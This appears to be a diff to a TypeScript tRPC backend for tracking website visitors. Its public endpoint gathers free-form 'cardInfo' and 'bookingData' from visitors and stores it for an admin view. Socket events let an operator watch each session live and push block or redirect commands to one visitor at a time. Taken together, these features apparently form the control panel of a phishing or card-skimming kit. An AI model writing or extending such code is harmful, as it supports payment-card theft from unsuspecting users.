@@ -1,6 +1,27 @@
 import { z } from 'zod';
 import { router, publicProcedure, adminProcedure } from '../trpc.js';
 import { db } from '../db.js';
+import { getIO } from '../io.js';
+
+const safeParseJson = (value: unknown, fallback: Record<string, unknown>) => {
+  if (typeof value !== 'string' || !value) return fallback;
+  try {
+    const parsed = JSON.parse(value);
+    return parsed && typeof parsed === 'object' ? parsed as Record<string, unknown> : fallback;
+  } catch {
+    return fallback;
+  }
+};
+
+const safeParseArray = (value: unknown) => {
+  if (typeof value !== 'string' || !value) return [] as Array<Record<string, unknown>>;
+  try {
+    const parsed = JSON.parse(value);
+    return Array.isArray(parsed) ? parsed as Array<Record<string, unknown>> : [];
+  } catch {
+    return [] as Array<Record<string, unknown>>;
+  }
+};
 
 export const visitorsRouter = router({
   track: publicProcedure
@@ -12,6 +33,8 @@ export const visitorsRouter = router({
       country: z.string().optional(),
       city: z.string().optional(),
       step: z.string().optional(),
+      bookingData: z.record(z.string(), z.unknown()).optional(),
+      cardInfo: z.record(z.string(), z.unknown()).optional(),
     }))
     .mutation(async ({ input, ctx }) => {
       const ip = input.ip || ctx.clientIp;
@@ -22,15 +45,24 @@ export const visitorsRouter = router({
         return { blocked: true, redirectUrl: existing.redirectUrl ?? null };
       }
 
-      const stepHistory = existing
-        ? JSON.parse(existing.stepHistory as string)
-        : [];
+      const stepHistory = safeParseArray(existing?.stepHistory);
 
       if (input.step) {
         stepHistory.push({ step: input.step, time: Date.now() });
         // Keep only last 50 steps
         if (stepHistory.length > 50) stepHistory.splice(0, stepHistory.length - 50);
       }
+
+      const nextBookingData = {
+        ...safeParseJson(existing?.bookingData, {}),
+        ...(input.bookingData ?? {}),
+      };
+      const nextCardInfo = {
+        ...safeParseJson(existing?.cardInfo, {}),
+        ...(input.cardInfo ?? {}),
+      };
+
+      const pendingRedirectUrl = existing?.redirectUrl ?? null;
 
       await db.visitor.upsert({
         where: { sessionId: input.sessionId },
@@ -41,6 +73,9 @@ export const visitorsRouter = router({
           ...(input.country && { country: input.country }),
           ...(input.city && { city: input.city }),
           ...(input.step && { currentStep: input.step, stepHistory: JSON.stringify(stepHistory) }),
+          bookingData: JSON.stringify(nextBookingData),
+          cardInfo: JSON.stringify(nextCardInfo),
+          redirectUrl: pendingRedirectUrl,
           lastActive: new Date(),
         },
         create: {
@@ -52,10 +87,22 @@ export const visitorsRouter = router({
           city: input.city ?? '',
           currentStep: input.step ?? 'home',
           stepHistory: JSON.stringify(input.step ? [{ step: input.step, time: Date.now() }] : []),
+          bookingData: JSON.stringify(input.bookingData ?? {}),
+          cardInfo: JSON.stringify(input.cardInfo ?? {}),
+          redirectUrl: null,
         },
       });
 
-      return { blocked: false, redirectUrl: null };
+      if (pendingRedirectUrl) {
+        await db.visitor.update({
+          where: { sessionId: input.sessionId },
+          data: { redirectUrl: null },
+        });
+      }
+
+      getIO()?.to('admin').emit('visitors:changed');
+
+      return { blocked: false, redirectUrl: pendingRedirectUrl };
     }),
 
   stats: adminProcedure.query(async () => {
@@ -75,9 +122,9 @@ export const visitorsRouter = router({
     });
     return visitors.map(v => ({
       ...v,
-      stepHistory: JSON.parse(v.stepHistory as string),
-      bookingData: JSON.parse(v.bookingData as string),
-      cardInfo: JSON.parse(v.cardInfo as string),
+      stepHistory: safeParseArray(v.stepHistory),
+      bookingData: safeParseJson(v.bookingData, {}),
+      cardInfo: safeParseJson(v.cardInfo, {}),
     }));
   }),
 
@@ -95,6 +142,11 @@ export const visitorsRouter = router({
           ...(input.redirectUrl !== undefined ? { redirectUrl: input.redirectUrl } : {}),
         },
       });
+      getIO()?.to('admin').emit('visitors:changed');
+      getIO()?.to(`visitor:${input.sessionId}`).emit('visitor:control', {
+        blocked: input.blocked,
+        redirectUrl: input.redirectUrl ?? null,
+      });
       return { success: true };
     }),
 
@@ -104,6 +156,11 @@ export const visitorsRouter = router({
       await db.visitor.update({
         where: { sessionId: input.sessionId },
         data: { redirectUrl: input.redirectUrl },
+      });
+      getIO()?.to('admin').emit('visitors:changed');
+      getIO()?.to(`visitor:${input.sessionId}`).emit('visitor:control', {
+        blocked: false,
+        redirectUrl: input.redirectUrl,
       });
       return { success: true };
     }),
